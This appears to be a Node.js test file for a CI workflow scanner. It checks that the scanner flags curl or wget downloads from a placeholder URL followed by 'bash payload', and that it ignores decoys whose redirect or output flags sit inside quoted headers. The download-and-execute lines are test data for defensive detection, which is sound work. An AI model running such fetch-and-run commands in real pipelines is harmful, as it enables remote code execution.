'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/file';
function checkYml(s){
 const yml=['on: push','permissions: read-all','jobs:','  reviewer:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',...s.split('\n').map(x=>'          '+x)].join('\n')+'\n';
 return inspectWorkflow(yml,{path:'.github/workflows/sentinel-round13.yml'});
}
const noHigh=[
 ['quoted header redirects are not shell redirects',"curl -fsSL "+U+" > safe -H 'X-Test: >payload extra'; bash payload"],
 ['quoted user-agent redirects are not shell redirects','curl -fsSL '+U+' > safe -A "agent >payload later"; bash payload'],
 ['quoted curl -o is data not a flag',"curl -fsSL "+U+" -o safe -H 'X: -o payload extra'; bash payload"],
 ['quoted wget -O is data not a flag',"wget -q -O safe "+U+" -U 'agent -O payload again'; bash payload"],
 ['quoted wget stdout redirect is data',"wget -q "+U+" > safe -U 'agent >payload later'; bash payload"],
 ['quoted curl long output is data',"curl -fsSL "+U+" -o safe -H 'X: --output=payload suffix'; bash payload"]
];
const high=[
 ['shell redirect after quoted fake',"curl -fsSL "+U+" -H 'X: >payload extra' > payload; bash payload"],
 ['quoted filename redirect','curl -fsSL '+U+' >"payload"; bash payload'],
 ['quoted fd3 redirect','curl -fsSL '+U+' 3>"payload" >&3; bash payload'],
 ['curl literal output','curl -fsSL '+U+' -o payload; bash payload'],
 ['wget literal output','wget -q -O payload '+U+'; bash payload']
];
for(const [name,script] of noHigh)test('quoted option control: '+name,()=>{
 const f=findingsForScript(script);
 assert.ok(!f.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),name+JSON.stringify(f));
 assert.ok(!checkYml(script).findings.some(x=>x.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'),name);
});
for(const [name,script] of high)test('quoted option positive: '+name,()=>{
 const f=findingsForScript(script);
 assert.ok(f.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),name+JSON.stringify(f));
 assert.ok(checkYml(script).findings.some(x=>x.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'),name);
});
